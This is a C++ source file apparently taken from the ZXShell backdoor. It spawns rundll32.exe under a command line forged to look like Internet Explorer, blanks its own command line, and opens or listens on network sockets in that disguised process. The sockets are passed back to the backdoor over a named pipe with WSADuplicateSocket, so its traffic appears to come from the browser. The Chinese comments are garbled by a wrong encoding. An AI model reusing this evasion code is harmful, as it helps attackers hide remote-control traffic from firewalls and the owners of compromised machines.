#include "shellmain.h"
#include "ieCreateSocket.h"
#include "loadExe.h"
#include "../zxsCommon/zxsWinAPI.h"
#include "..\zxsCommon\debugoutput.h"
#include "ddos.h"
#include "..\zxsCommon\RegEdit.h"
#include "..\zxsCommon\CommandLineToArgvA.h"


//export for rundll32
void CALLBACK zxFunction002(
				HWND hWnd, // handle to owner window
				HINSTANCE hInst, // instance handle for the DLL
				char *Param, // string the DLL will parse
				int nCmdShow // show state
)
{
	//__asm INT 3
	char argv0[50];

	__printf("zxFunction002: %s\r\n", Param);

	_snprintf(argv0, 49, "%s", Param);
	ModifyCmdLine(GetCurrentProcessId(), "    ");

	//
	MakeDupSocket(argv0);
}

SOCKET __ieConnectHost(char *szIP, WORD wPort)
{
	if (inet_addr(szIP) != INADDR_NONE)
		return ConnectHost(inet_addr(szIP), wPort);
	else
	{
		if (DNS(szIP) != NULL)
			return ConnectHost(inet_addr(DNS(szIP)), wPort);
		else
			return 0;
	}
}


/*
readfrompipe (IESOCKET)ies
writetopipe  (IESOCKETSHAREDDATA)ieSocketShared
*/
BOOL MakeDupSocket(char *lpszPipeName)
{
	BOOL Result, fConnected, fSuccess; 
	HANDLE hPipe, hThread;

	SOCKET Socket = INVALID_SOCKET;
	IESOCKET ies;
	IESOCKETSHAREDDATA ieSocketShared;
	DWORD cbBytesRead, cbWritten, replyCode;

	char szFullPipename[MAX_PATH];

	Result = FALSE;

	sprintf(szFullPipename, "\\\\.\\pipe\\%s", lpszPipeName);

	__printf("MakeDupSocket02 szFullPipename = %s\r\n", szFullPipename); 

	//���ӹܵ�
	hPipe = ZXSAPI::CreateFile(
		szFullPipename, 
		GENERIC_READ|GENERIC_WRITE,
		FILE_SHARE_READ|FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		SECURITY_IMPERSONATION,
		NULL);
	if(!hPipe) 
	{
		__printf("CreateFile Pipe: failed = %d\r\n", GetLastError()); 
		goto Cleanup;
	}

	//��������
	fSuccess = ZXSAPI::ReadFile( 
		 hPipe,        // handle to pipe 
		 &ies,    // buffer to receive data 
		 sizeof(ies), // size of buffer 
		 &cbBytesRead, // number of bytes read 
		 NULL);        // not overlapped I/O 

	if(!fSuccess || cbBytesRead != sizeof(ies)) 
	{
		__printf("Read CPipe: ReadFile failed = %d\r\n", GetLastError()); 
		goto Cleanup;
	}

	//ִ�����綯��

	InitSock();

	if(ies.action == IESOCKET_ACTION_CONNECT)
	{
		Socket = __ieConnectHost(ies.host, ies.port);

		if(Socket == 0)//����Ŀ��ʧ��
		{
			__printf("IESOCKET_ACTION_CONNECT failed\r\n"); 
			Socket = INVALID_SOCKET;//��־ΪINVALID_SOCKET
		}

	}else if(ies.action == IESOCKET_ACTION_LISTEN)
	{
		Socket = CreateSocket(ies.host, ies.port);

		if(Socket == 0)//�����˿�ʧ��
		{
			__printf("IESOCKET_ACTION_LISTEN failed\r\n"); 
			Socket = INVALID_SOCKET;//��־ΪINVALID_SOCKET
		}

	}else
	{
		__printf("unknown ies.action = %d\r\n", ies.action); 
		Socket = INVALID_SOCKET;
	}

	//ִ�����綯��ʧ��
	if(Socket == INVALID_SOCKET)
	{
		replyCode = GetLastError(); //�ܵ��ظ������
		__printf("IESOCKET_ACTION error = %d\r\n", replyCode);
		if(replyCode == 0)
			replyCode = ~0;
	}else
	{
		replyCode = 0;//�ܵ��ظ���0
	}

	ieSocketShared.retCode = replyCode;//����״̬��

	if(replyCode == 0)
	{
		//������ID ies.sharePID �����׽���
		if(ZXSAPI::WSADuplicateSocketA(Socket, ies.sharePID, &ieSocketShared.WSAPI) == SOCKET_ERROR)
		{
			replyCode = GetLastError();
			if(replyCode == 0)
				replyCode = ~0;
			ieSocketShared.retCode = replyCode;//��������״̬��

			__printf("WSADuplicateSocket failed: %d\r\n", replyCode);
		}
	}

	//���Ƴɹ���ͨ���ܵ��ش�IESOCKETSHAREDDATA�ṹ��
	//retCode�����綯����״̬��, 0Ϊ�޴���
	//WSAPI�ṹ���Ǹ������̴��������׽�������Ҫ������
	fSuccess = ZXSAPI::WriteFile( 
		hPipe,        // handle to pipe 
		&ieSocketShared,      // buffer to write from 
		sizeof(ieSocketShared), // number of bytes to write 
		&cbWritten,   // number of bytes written 
		NULL);        // not overlapped I/O 

	if(!fSuccess || cbWritten != sizeof(ieSocketShared)) 
	{
		__printf("Write CPipe: WriteFile failed (WSAPI)\r\n"); 
		goto Cleanup;
	}

	Result = TRUE;

Cleanup:

	if(hPipe)
		CloseHandle(hPipe);

	return Result;
}

/*
ieCreateSocket ���� ie������ie����Ϊrundll32����rundll32���� zxFunction002��

zxFunction002 ���Ӹ����̹ܵ����������ִ���������ӵȶ�������󽫸��Ƶ��׽��ֻش���������

*/
BOOL ieCreateSocket(PIESOCKET iesock)
{
	BOOL Result = FALSE, fConnected;

	char pipeName[50];
	char szSysDir[MAX_PATH];
	char szIEPath[MAX_PATH];
	char szRundll32Path[MAX_PATH];
	char szCmdLine[MAX_PATH];
	char szFullPipename[MAX_PATH];
	PROCESS_INFORMATION pi = {0};
	bool childProcCreated = false;
	DWORD replyCode=~0, cbBytesRead, cbWritten;
	IESOCKETSHAREDDATA ieSocketShared = {0};

	DWORD timecount;

	HANDLE hPipe = NULL;

	sprintf(pipeName, "DUPSOCKET_%.8x", MakeRand32(GetTickCount()));

	GetSystemDirectory(szSysDir, MAX_PATH);
	//��ȡĬ���������·��
	if(!ReadReg(HKEY_LOCAL_MACHINE,
		"SOFTWARE\\Classes\\HTTP\\shell\\open\\command",
		"",
		szIEPath,
		MAX_PATH))
	{
		lstrcpy(szIEPath, "C:\\Program Files\\Internet Explorer\\iexplore.exe");
		szIEPath[0] = szSysDir[0];
	}else
	{
		ARGWTOARGVA arg(szIEPath);

		int argc = arg.GetArgc();
		char **argv = arg.GetArgv();
		lstrcpy(szIEPath, argv[0]);
	}

	//����zxFunction002�ź���
	sprintf(szCmdLine, "%s %s,zxFunction002 %s", szIEPath, g_DllPath, pipeName);
	sprintf(szRundll32Path, "%s\\rundll32.exe", szSysDir);
	sprintf(szFullPipename, "\\\\.\\pipe\\%s", pipeName);

	char *pdealslash = szCmdLine;
	while(*pdealslash)
	{
		if(*pdealslash == '\\')
			*pdealslash = '/';
		pdealslash++;
	}

	hPipe = CreateNamedPipe( 
				  szFullPipename,             // pipe name 
				  PIPE_ACCESS_DUPLEX,       // read/write access 
				  PIPE_TYPE_MESSAGE |       // message type pipe 
				  PIPE_READMODE_MESSAGE |   // message-read mode 
				  PIPE_WAIT,                // blocking mode 
				  PIPE_UNLIMITED_INSTANCES, // max. instances  
				  sizeof(IESOCKETSHAREDDATA)
				  +sizeof(IESOCKET),                  // output buffer size 
				  sizeof(IESOCKETSHAREDDATA)
				  +sizeof(IESOCKET),                  // input buffer size 
				  30000,                   // client time-out 
				  NULL);                    // default security attribute 

	if (hPipe == INVALID_HANDLE_VALUE) 
	{
		__printf("CreatePipe failed\r\n"); 
		goto _ERROR;
	}

	__printf("szCmdLine = %s\r\n", szCmdLine);

	//����IE���̣�����ie���̵Ĵ������ΪRundll32
	//����Ϊrundll32����Ϊrundll32���������ĵ���ָ��dll�ĺ����������õ�Զ��ע���������������ע�ġ�Σ����Ϊ��
	//���������ĳ���ʵ������Rundll32����ȴ��ie���̵�����ִ�����綯��
	//Rundll32������ͻ����zxFunction002�����������ӹܵ����ȴ�����

	timecount = GetTickCount();

	Result = loadExe(szCmdLine, szRundll32Path, NULL, &pi);

	if(!Result)
	{
		__printf("loadExe failed\r\n"); 
		goto _ERROR;
	}

	timecount = GetTickCount() - timecount;

	__printf("loadExe used %d ms\r\n", timecount);

	timecount = GetTickCount();

	childProcCreated = true;

	fConnected = ConnectNamedPipe(hPipe, NULL) ? 
	 TRUE : (GetLastError() == ERROR_PIPE_CONNECTED); 

	if(!fConnected) 
	{
		__printf("ConnectNamedPipe failed\r\n"); 
		goto _ERROR;
	}

	timecount = GetTickCount() - timecount;

	__printf("ConnectNamedPipe used %d ms\r\n", timecount);

	timecount = GetTickCount();

	//ͨ���ܵ���������
	//ע��iesock��ָ��, sizeof(IESOCKET)
	Result = ZXSAPI::WriteFile(
		hPipe,
		iesock,
		sizeof(IESOCKET),
		&cbWritten,
		NULL);

	if(!Result || cbWritten != sizeof(IESOCKET))
	{
		__printf("SPipe: WriteFile= %d, errcode: %d, cbWritten: %d\r\n", Result, GetLastError(), cbWritten);
		goto _ERROR;
	}

	Result = ZXSAPI::ReadFile( 
		 hPipe,        // handle to pipe 
		 &ieSocketShared,    // buffer to receive data 
		 sizeof(ieSocketShared), // size of buffer 
		 &cbBytesRead, // number of bytes read 
		 NULL);        // not overlapped I/O 

	if(!Result || cbBytesRead != sizeof(ieSocketShared))
	{
		__printf("SPipe: ReadFile= %d, errcode: %d, cbBytesRead: %d\r\n", 
			Result, 
			GetLastError(), 
			cbBytesRead);
		goto _ERROR;
	}

	//���� ʧ��
	if(ieSocketShared.retCode != 0)
	{
		iesock->Socket = INVALID_SOCKET;

		__printf("fail to get socket, error: %d\r\n", ieSocketShared.retCode);
	}else
	{

		iesock->Socket = ZXSAPI::WSASocket(
			iesock->af,
			iesock->type,
			iesock->protocol,
			&ieSocketShared.WSAPI,
			0,
			iesock->dwFlags);
	}

	if(iesock->Socket != INVALID_SOCKET)
		Result = TRUE;

	timecount = GetTickCount() - timecount;

	__printf("WSASocket used %d ms\r\n", timecount);

_ERROR:
	if(childProcCreated)
	{
		ZXSAPI::TerminateProcess(pi.hProcess, 0);
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
	}
	if(hPipe)
	{
		DisconnectNamedPipe(hPipe);
		CloseHandle(hPipe);
	}

	return Result;
}